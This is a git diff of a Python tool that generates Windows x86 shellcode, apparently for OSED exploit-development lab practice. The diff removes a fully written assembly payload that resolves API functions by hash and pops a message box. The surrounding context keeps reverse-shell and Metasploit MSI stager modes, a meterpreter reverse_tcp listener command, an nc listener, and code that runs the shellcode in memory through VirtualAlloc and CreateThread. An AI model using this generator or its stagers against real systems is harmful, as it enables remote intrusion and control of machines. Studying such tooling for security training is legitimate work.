@@ -50,7 +50,6 @@ def push_string(input_string):
 
     instructions = []
     first_instructions = []
-    null_terminated = False
     for i in range(rev_hex_payload_len, 0, -1):
         # add every 4 byte (8 chars) to one push statement
         if ((i != 0) and ((i % 8) == 0)):
@@ -71,7 +70,6 @@ def push_string(input_string):
                 first_instructions.append("push eax;")
                 first_instructions.append(f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
                 first_instructions.append("push ax;")
-            null_terminated = True
 
     instructions = first_instructions + instructions
     asm_instructions = "".join(instructions)
@@ -401,122 +399,6 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
     return "\n".join(asm)
 
 
-def msg_box(header, text, breakpoint=0):
-    # MessageBoxA() in user32.dll
-    push_instr_user32 = push_string("user32.dll")
-    push_instr_msgbox_hash = push_function_hash("MessageBoxA")
-    push_instr_terminate_hash = push_function_hash("TerminateProcess")
-    push_instr_loadlibrarya_hash = push_function_hash("LoadLibraryA")
-    push_instr_header = push_string(header)
-    push_instr_text = push_string(text)
-
-    asm = [
-        "   start:                               ",
-        f"{['', 'int3;'][breakpoint]}            ",
-        "       mov ebp, esp                    ;",  #
-        "       add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
-        "   find_kernel32:                       ",
-        "       xor ecx,ecx                     ;",  # ECX = 0
-        "       mov esi,fs:[ecx+30h]            ;",  # ESI = &(PEB) ([FS:0x30])
-        "       mov esi,[esi+0Ch]               ;",  # ESI = PEB->Ldr
-        "       mov esi,[esi+1Ch]               ;",  # ESI = PEB->Ldr.InInitOrder
-        "   next_module:                         ",
-        "       mov ebx, [esi+8h]               ;",  # EBX = InInitOrder[X].base_address
-        "       mov edi, [esi+20h]              ;",  # EDI = InInitOrder[X].module_name
-        "       mov esi, [esi]                  ;",  # ESI = InInitOrder[X].flink (next)
-        "       cmp [edi+12*2], cx              ;",  # (unicode) modulename[12] == 0x00?
-        "       jne next_module                 ;",  # No: try next module.
-        "   find_function_shorten:               ",
-        "       jmp find_function_shorten_bnc   ;",  # Short jump
-        "   find_function_ret:                   ",
-        "       pop esi                         ;",  # POP the return address from the stack
-        "       mov [ebp+0x04], esi             ;",  # Save find_function address for later usage
-        "       jmp resolve_symbols_kernel32    ;",  #
-        "   find_function_shorten_bnc:           ",
-        "       call find_function_ret          ;",  # Relative CALL with negative offset
-        "   find_function:                       ",
-        "       pushad                          ;",  # Save all registers from Base address of kernel32 is in EBX Previous step (find_kernel32)
-        "       mov eax, [ebx+0x3c]             ;",  # Offset to PE Signature
-        "       mov edi, [ebx+eax+0x78]         ;",  # Export Table Directory RVA
-        "       add edi, ebx                    ;",  # Export Table Directory VMA
-        "       mov ecx, [edi+0x18]             ;",  # NumberOfNames
-        "       mov eax, [edi+0x20]             ;",  # AddressOfNames RVA
-        "       add eax, ebx                    ;",  # AddressOfNames VMA
-        "       mov [ebp-4], eax                ;",  # Save AddressOfNames VMA for later
-        "   find_function_loop:                  ",
-        "       jecxz find_function_finished    ;",  # Jump to the end if ECX is 0
-        "       dec ecx                         ;",  # Decrement our names counter
-        "       mov eax, [ebp-4]                ;",  # Restore AddressOfNames VMA
-        "       mov esi, [eax+ecx*4]            ;",  # Get the RVA of the symbol name
-        "       add esi, ebx                    ;",  # Set ESI to the VMA of the current
-        "   compute_hash:                        ",
-        "       xor eax, eax                    ;",  # NULL EAX
-        "       cdq                             ;",  # NULL EDX
-        "       cld                             ;",  # Clear direction
-        "   compute_hash_again:                  ",
-        "       lodsb                           ;",  # Load the next byte from esi into al
-        "       test al, al                     ;",  # Check for NULL terminator
-        "       jz compute_hash_finished        ;",  # If the ZF is set, we've hit the NULL term
-        "       ror edx, 0x0d                   ;",  # Rotate edx 13 bits to the right
-        "       add edx, eax                    ;",  # Add the new byte to the accumulator
-        "       jmp compute_hash_again          ;",  # Next iteration
-        "   compute_hash_finished:               ",
-        "   find_function_compare:               ",
-        "       cmp edx, [esp+0x24]             ;",  # Compare the computed hash with the requested hash
-        "       jnz find_function_loop          ;",  # If it doesn't match go back to find_function_loop
-        "       mov edx, [edi+0x24]             ;",  # AddressOfNameOrdinals RVA
-        "       add edx, ebx                    ;",  # AddressOfNameOrdinals VMA
-        "       mov cx, [edx+2*ecx]             ;",  # Extrapolate the function's ordinal
-        "       mov edx, [edi+0x1c]             ;",  # AddressOfFunctions RVA
-        "       add edx, ebx                    ;",  # AddressOfFunctions VMA
-        "       mov eax, [edx+4*ecx]            ;",  # Get the function RVA
-        "       add eax, ebx                    ;",  # Get the function VMA
-        "       mov [esp+0x1c], eax             ;",  # Overwrite stack version of eax from pushad
-        "   find_function_finished:              ",
-        "       popad                           ;",  # Restore registers
-        "       ret                             ;",  #
-        "   resolve_symbols_kernel32:            ",
-        push_instr_terminate_hash,                   # TerminateProcess hash
-        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
-        "       mov [ebp+0x10], eax             ;",  # Save TerminateProcess address for later
-        push_instr_loadlibrarya_hash,                # LoadLibraryA hash
-        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
-        "       mov [ebp+0x14], eax             ;",  # Save LoadLibraryA address for later
-        "   load_user32:                         ",
-        "       xor eax, eax                    ;",  # Null EAX / Push the target library string on the stack --> user32.dll
-        "       push eax                        ;",  # Push a null byte
-       push_instr_user32,                              # Push the DLL name
-        "       push esp                        ;",  # Push ESP to have a pointer to the string
-        "       call dword ptr [ebp+0x14]       ;",  # Call LoadLibraryA
-        "   resolve_symbols_user32:              ",
-        "       mov ebx, eax                    ;",  # Move the base address of user32.dll to EBX
-        push_instr_msgbox_hash,                      # MessageBoxA hash
-        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
-        "       mov [ebp+0x18], eax             ;",  # Save MessageBoxA address for later
-        "   call_system:                         ",  # Push the target stings on the stack (https://www.fuzzysecurity.com/tutorials/expDev/6.html)
-        "       xor eax, eax                    ;",  # Null EAX
-        "       push eax                        ;",  # Create a null byte on the stack
-        push_instr_header,                           # Push the header text
-        "       mov ebx, esp                    ;",  # Store the pointer to the window header in ebx
-        "       xor eax, eax                    ;",  # Null EAX
-        "       push eax                        ;",  # Create a null byte on the stack
-        push_instr_text,                             # Push the text
-        "       mov ecx, esp                    ;",  # Store the pointer to the window text in ecx
-        "       xor eax, eax                    ;",  # Null EAX
-        "       push eax                        ;",  # Create a null byte on the stack for uType=0x00000000
-        "       push ebx                        ;",  # Put a pointer to the window header on the stack
-        "       push ecx                        ;",  # Put a pointer to the window text on the stack
-        "       push eax                        ;",  # Create a null byte on the stack for hWnd=0x00000000
-        "       call dword ptr [ebp+0x18]       ;",  # Call MessageBoxA (https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa)
-        "   exec_shellcode:                      ",
-        "       xor ecx, ecx                    ;",  # Null ECX
-        "       push ecx                        ;",  # uExitCode
-        "       push 0xffffffff                 ;",  # hProcess
-        "       call dword ptr [ebp+0x10]       ;",  # Call TerminateProcess
-    ]
-    return "\n".join(asm)
-
-
 def main(args):
     help_msg = ""
     if (args.msi):
@@ -527,22 +409,18 @@ def main(args):
         help_msg += f"\t\t sudo python -m SimpleHTTPServer {args.lport} \n"
         help_msg += f"\t Start the metasploit listener:\n"
         help_msg += f'\t\t sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {args.lhost}; set LPORT 443; exploit"'
-    elif (args.messagebox):
-        shellcode = msg_box(args.mb_header, args.mb_text, args.debug_break)
     else:
         shellcode = rev_shellcode(args.lhost, args.lport, args.debug_break)
         help_msg += f"\t Start listener:\n"
         help_msg += f"\t\t nc -lnvp {args.lport}"
 
-    print(shellcode)
+    #print(shellcode)
     eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
     encoding, count = eng.asm(shellcode)
 
-    final = ""
+    final = 'shellcode = b"'
 
-    final += 'shellcode = b"'
-
-    for enc in encoding:
+    for enc in encoding: #type: ignore
         final += "\\x{0:02x}".format(enc)
 
     final += '"'
@@ -559,7 +437,7 @@ def main(args):
         raise SystemExit("[!] Remove bad characters and try again")
 
     print(f"[+] shellcode created!")
-    print(f"[=]   len:   {len(encoding)} bytes")
+    print(f"[=]   len:   {len(encoding)} bytes") #type: ignore
     print(f"[=]   lhost: {args.lhost}")
     print(f"[=]   lport: {args.lport}")
     print(
@@ -569,7 +447,7 @@ def main(args):
     if args.store_shellcode:
         print(f"[=]   Shellcode stored in: shellcode.bin")
         f = open("shellcode.bin", "wb")
-        f.write(bytearray(encoding))
+        f.write(bytearray(encoding)) #type: ignore
         f.close()
     print(f"[=]   help:")
     print(help_msg)
@@ -583,23 +461,23 @@ def main(args):
     if args.test_shellcode and (struct.calcsize("P")*8) == 32:
         print(f"\n[+] Debugging shellcode ...")
         sh = b""
-        for e in encoding:
+        for e in encoding: #type: ignore
             sh += struct.pack("B", e)
 
         packed_shellcode = bytearray(sh)
-        ptr = ctypes.windll.kernel32.VirtualAlloc(
+        ptr = ctypes.windll.kernel32.VirtualAlloc( #type: ignore
             ctypes.c_int(0),
             ctypes.c_int(len(packed_shellcode)),
             ctypes.c_int(0x3000),
             ctypes.c_int(0x40),
         )
         buf = (ctypes.c_char * len(packed_shellcode)).from_buffer(packed_shellcode)
-        ctypes.windll.kernel32.RtlMoveMemory(
+        ctypes.windll.kernel32.RtlMoveMemory( #type: ignore
             ctypes.c_int(ptr), buf, ctypes.c_int(len(packed_shellcode))
         )
         print("[=]   Shellcode located at address %s" % hex(ptr))
         input("...ENTER TO EXECUTE SHELLCODE...")
-        ht = ctypes.windll.kernel32.CreateThread(
+        ht = ctypes.windll.kernel32.CreateThread( #type: ignore
             ctypes.c_int(0),
             ctypes.c_int(0),
             ctypes.c_int(ptr),
@@ -607,14 +485,13 @@ def main(args):
             ctypes.c_int(0),
             ctypes.pointer(ctypes.c_int(0)),
         )
-        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
+        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1)) #type: ignore
 
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
         description="Creates shellcodes compatible with the OSED lab VM"
     )
-
     parser.add_argument(
         "-l",
         "--lhost",
@@ -636,15 +513,6 @@ if __name__ == "__main__":
     )
     parser.add_argument(
         "-m", "--msi", help="use an msf msi exploit stager (short)", action="store_true"
-    )
-    parser.add_argument(
-        "--messagebox", help="create a message box payload", action="store_true"
-    )
-    parser.add_argument(
-        "--mb-header", help="message box header text"
-    )
-    parser.add_argument(
-        "--mb-text", help="message box text"
     )
     parser.add_argument(
         "-d",
